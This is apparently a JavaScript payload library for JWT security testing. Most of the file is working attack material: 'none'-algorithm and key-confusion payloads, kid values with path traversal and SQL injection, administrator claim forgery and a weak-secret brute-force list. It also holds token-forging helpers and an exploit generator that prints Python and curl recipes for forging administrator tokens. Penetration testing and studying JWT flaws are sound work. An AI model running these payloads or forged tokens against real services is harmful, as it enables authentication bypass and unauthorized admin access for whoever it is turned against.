// JWT Vulnerability Payloads
// Comprehensive payload database for JWT security testing

const JWTPayloads = {
    // Algorithm confusion attacks
    algorithmConfusion: [
        { alg: 'none', description: 'No signature algorithm' },
        { alg: 'None', description: 'Case variation - None' },
        { alg: 'NONE', description: 'Case variation - NONE' },
        { alg: 'nOnE', description: 'Mixed case - nOnE' },
        { alg: 'HS256', original: 'RS256', description: 'RSA to HMAC confusion' },
        { alg: 'HS384', original: 'RS384', description: 'RS384 to HS384' },
        { alg: 'HS512', original: 'RS512', description: 'RS512 to HS512' }
    ],

    // Signature stripping
    signatureStripping: [
        { technique: 'Remove signature', description: 'Delete signature portion entirely' },
        { technique: 'Empty signature', description: 'Set signature to empty string' },
        { technique: 'Invalid signature', description: 'Replace with random base64' }
    ],

    // Key injection via header
    headerInjection: [
        { header: 'jwk', description: 'Embed public key in header' },
        { header: 'jku', description: 'Point to attacker JWK Set URL' },
        { header: 'x5u', description: 'Point to attacker X.509 cert URL' },
        { header: 'x5c', description: 'Embed X.509 certificate chain' }
    ],

    // kid parameter attacks
    kidAttacks: [
        { kid: '../../../dev/null', description: 'Path traversal to empty file' },
        { kid: '/dev/null', description: 'Direct path to null device' },
        { kid: "' UNION SELECT 'secret'--", description: 'SQL injection in kid' },
        { kid: '../../../../../../etc/passwd', description: 'Path traversal to passwd' },
        { kid: 'AA==', description: 'Base64 null byte key' }
    ],

    // Claim manipulation
    claimManipulation: [
        { claim: 'sub', value: 'administrator', description: 'Change subject to admin' },
        { claim: 'role', value: 'admin', description: 'Add admin role' },
        { claim: 'admin', value: true, description: 'Set admin flag' },
        { claim: 'exp', value: 9999999999, description: 'Extend expiration' },
        { claim: 'iat', value: 0, description: 'Backdate issued at' }
    ],

    // Weak secret attacks
    weakSecrets: [
        'secret', 'password', '123456', 'key', 'private',
        'jwt_secret', 'supersecret', 'changeme', 'admin',
        'secret123', 'password123', 'test', 'development'
    ],

    // Common JWT structure
    jwtStructure: {
        header: { alg: 'HS256', typ: 'JWT' },
        payload: { sub: 'user', iat: 1516239022 }
    }
};

// JWT utility functions
function base64UrlEncode(str) {
    return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function base64UrlDecode(str) {
    str = str.replace(/-/g, '+').replace(/_/g, '/');
    while (str.length % 4) str += '=';
    return atob(str);
}

function parseJWT(token) {
    try {
        const parts = token.split('.');
        if (parts.length !== 3) return null;
        return {
            header: JSON.parse(base64UrlDecode(parts[0])),
            payload: JSON.parse(base64UrlDecode(parts[1])),
            signature: parts[2]
        };
    } catch {
        return null;
    }
}

function createJWT(header, payload, signature = '') {
    const headerB64 = base64UrlEncode(JSON.stringify(header));
    const payloadB64 = base64UrlEncode(JSON.stringify(payload));
    return `${headerB64}.${payloadB64}.${signature}`;
}

function createNoneAlgToken(payload) {
    const header = { alg: 'none', typ: 'JWT' };
    return createJWT(header, payload, '');
}

// Helper functions
function getAlgorithmConfusionPayloads() {
    return JWTPayloads.algorithmConfusion;
}

function getHeaderInjectionPayloads() {
    return JWTPayloads.headerInjection;
}

function getKidAttackPayloads() {
    return JWTPayloads.kidAttacks;
}

function getClaimPayloads() {
    return JWTPayloads.claimManipulation;
}

function getPayloadCount() {
    return JWTPayloads.algorithmConfusion.length +
        JWTPayloads.signatureStripping.length +
        JWTPayloads.headerInjection.length +
        JWTPayloads.kidAttacks.length +
        JWTPayloads.claimManipulation.length +
        JWTPayloads.weakSecrets.length;
}

function generateExploit(type, originalToken) {
    const parsed = originalToken ? parseJWT(originalToken) : null;

    switch (type) {
        case 'none':
            return `# Algorithm None Attack

# Original JWT header:
{"alg": "HS256", "typ": "JWT"}

# Modified header (remove algorithm):
{"alg": "none", "typ": "JWT"}

# Modified payload (elevate privileges):
{"sub": "administrator", "exp": 9999999999}

# Create token with empty signature:
header.payload.

# Python script:
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"administrator"}).encode()).decode().rstrip('=')
print(f"{header}.{payload}.")`;

        case 'confusion':
            return `# Algorithm Confusion Attack (RS256 → HS256)

# When server uses RS256 but accepts HS256:
# Sign JWT with public key as HMAC secret

# Step 1: Get server's public key
curl https://target.com/.well-known/jwks.json

# Step 2: Create JWT signed with public key
import jwt
public_key = open('public_key.pem').read()

token = jwt.encode(
    {"sub": "administrator"},
    public_key,
    algorithm="HS256"
)

# The server will verify HMAC using its public key`;

        case 'kid':
            return `# kid Parameter Injection

# Path traversal to use empty key:
{"alg": "HS256", "kid": "../../../dev/null", "typ": "JWT"}

# Sign with empty string as secret:
import jwt
token = jwt.encode(
    {"sub": "administrator"},
    "",  # Empty secret
    algorithm="HS256",
    headers={"kid": "../../../dev/null"}
)

# SQL injection in kid:
{"alg": "HS256", "kid": "' UNION SELECT 'secret'--", "typ": "JWT"}`;

        case 'jwk':
            return `# JWK Header Injection

# Embed your own public key in the JWT header:
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "your_public_key_n",
    "e": "AQAB"
  }
}

# Generate keypair and sign token:
from cryptography.hazmat.primitives.asymmetric import rsa
key = rsa.generate_private_key(65537, 2048)

# Server trusts embedded key and verifies signature`;

        default:
            return '';
    }
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        JWTPayloads,
        base64UrlEncode,
        base64UrlDecode,
        parseJWT,
        createJWT,
        createNoneAlgToken,
        getAlgorithmConfusionPayloads,
        getHeaderInjectionPayloads,
        getKidAttackPayloads,
        getClaimPayloads,
        getPayloadCount,
        generateExploit
    };
}
